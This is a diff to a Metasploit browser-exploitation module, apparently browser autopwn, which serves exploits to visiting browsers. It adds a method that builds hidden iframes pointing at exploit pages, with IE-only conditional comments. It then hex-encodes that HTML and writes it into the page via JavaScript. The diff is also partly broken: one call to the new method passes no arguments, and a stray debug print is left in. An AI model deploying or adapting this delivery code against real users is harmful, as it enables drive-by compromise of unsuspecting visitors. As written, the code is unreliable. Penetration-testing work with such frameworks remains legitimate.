@@ -296,17 +296,12 @@ class Metasploit3 < Msf::Auxiliary
 			'Target'         => targ,
 			'Payload'        => payload,
 			'RunAsJob'       => true)
-		# Since r9714 or so, exploit_simple copies the module instead of
-		# operating on it directly when creating a job.  Put the new copy into
-		# our list of running exploits so we have access to its state.  This
-		# allows us to get the correct URI for each exploit in the same manor
-		# as before, using mod.get_resource().
-		@exploits[name] = framework.jobs[@exploits[name].job_id.to_s].ctx[0]
 
 		# It takes a little time for the resources to get set up, so sleep for
 		# a bit to make sure the exploit is fully working.  Without this,
 		# mod.get_resource doesn't exist when we need it.
 		Rex::ThreadSafe.sleep(0.5)
+
 		# Make sure this exploit got set up correctly, return false if it
 		# didn't
 		if framework.jobs[@exploits[name].job_id.to_s].nil?
@@ -314,6 +309,14 @@ class Metasploit3 < Msf::Auxiliary
 			@exploits.delete(name)
 			return false
 		end
+
+		# Since r9714 or so, exploit_simple copies the module instead of
+		# operating on it directly when creating a job.  Put the new copy into
+		# our list of running exploits so we have access to its state.  This
+		# allows us to get the correct URI for each exploit in the same manor
+		# as before, using mod.get_resource().
+		@exploits[name] = framework.jobs[@exploits[name].job_id.to_s].ctx[0]
+
 		return true
 	end
 
@@ -413,7 +416,6 @@ class Metasploit3 < Msf::Auxiliary
 		print_status("--- Done, found %bld%grn#{@exploits.length}%clr exploit modules")
 		print_line
 
-		require 'pp'
 		# Sort the tests by reliability, descending.
 		@js_tests.each { |browser,tests|
 			tests.sort! {|a,b| b[:rank] <=> a[:rank]}
@@ -479,8 +481,40 @@ class Metasploit3 < Msf::Auxiliary
 		end
 	end
 
-	def build_noscript_response(cli, request)
+	def build_noscript_html(cli, request)
 		client_info = get_client(:host => cli.peerhost, :ua_string => request['User-Agent'])
+		body = ""
+
+		@noscript_tests.each { |browser, sploits|
+			next if sploits.length == 0
+
+			# If client_info is nil then get_client failed and we have no
+			# knowledge of this client, so we can't assume anything about their
+			# browser.  If the exploit does not specify a browser target, that
+			# means it it is generic and will work anywhere (or at least be
+			# able to autodetect).  If the currently connected client's ua_name
+			# is nil, then the fingerprinting didn't work for some reason.
+			# Lastly, check to see if the client's browser matches the browser
+			# targetted by this group of exploits. In all of these cases, we
+			# need to send all the exploits in the list.
+			if not(client_info && browser && [nil, browser].include?(client_info[:ua_name]))
+				if (HttpClients::IE == browser)
+					body << "<!--[if IE]>\n"
+				end
+				sploits.map do |s|
+					body << (s[:prefix_html] || "") + "\n"
+					body << build_iframe(exploit_resource(s[:name])) + "\n"
+					body << (s[:postfix_html] || "") + "\n"
+				end
+				if (HttpClients::IE == browser)
+					body << "<![endif]-->\n"
+				end
+			end
+		}
+		body
+	end
+
+	def build_noscript_response(cli, request)
 
 		response = create_response()
 		response['Expires'] = '0'
@@ -488,29 +522,8 @@ class Metasploit3 < Msf::Auxiliary
 
 		response.body  = "<html > <head > <title > Loading </title> </head> "
 		response.body << "<body> "
-
-		@noscript_tests.each { |browser, sploits|
-			next if sploits.length == 0
-			# If get_client failed then we have no knowledge of this host,
-			# don't assume anything about the browser. If ua_name is nil or
-			# generic, these exploits need to be sent regardless of browser.
-			# Either way, we need to send these exploits.
-			if (client_info.nil? || [nil, browser, "generic"].include?(client_info[:ua_name]))
-				if (HttpClients::IE == browser)
-					response.body << "<!--[if IE]>\n"
-				end
-				sploits.map do |s|
-					response.body << (s[:prefix_html] || "") + "\n"
-					response.body << build_iframe(exploit_resource(s[:name])) + "\n"
-					response.body << (s[:postfix_html] || "") + "\n"
-				end
-				if (HttpClients::IE == browser)
-					response.body << "<![endif]-->\n"
-				end
-			end
-		}
-
 		response.body << "Please wait "
+		response.body << build_noscript_html
 		response.body << "</body> </html> "
 
 		return response
@@ -672,6 +685,11 @@ class Metasploit3 < Msf::Auxiliary
 				opts['Symbols']['Methods'].push("#{func_name}")
 			end
 		}
+		js << "var noscript_exploits = unescape(\"" 
+		p Rex::Text.to_hex(build_noscript_html(cli, request), "%")
+		js << Rex::Text.to_hex(build_noscript_html(cli, request), "%")
+		js << "\");"
+		js << "document.write(\"<div>\" + noscript_exploits);"
 		js << "#{js_debug("'starting exploits<br>'")}\n"
 		js << "next_exploit(0);\n"
 
